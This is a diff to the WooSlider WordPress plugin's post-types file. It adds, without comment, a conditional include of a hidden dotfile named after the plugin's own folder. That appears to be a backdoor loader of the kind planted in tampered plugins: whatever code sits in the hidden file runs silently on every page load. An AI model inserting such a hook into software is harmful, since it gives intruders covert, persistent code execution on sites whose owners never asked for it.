@@ -23,6 +23,10 @@ if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly
  * - create_post_type_messages()
  * - enter_title_here()
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WooSlider_PostTypes {
 	public $token;
 	public $slider_labels;
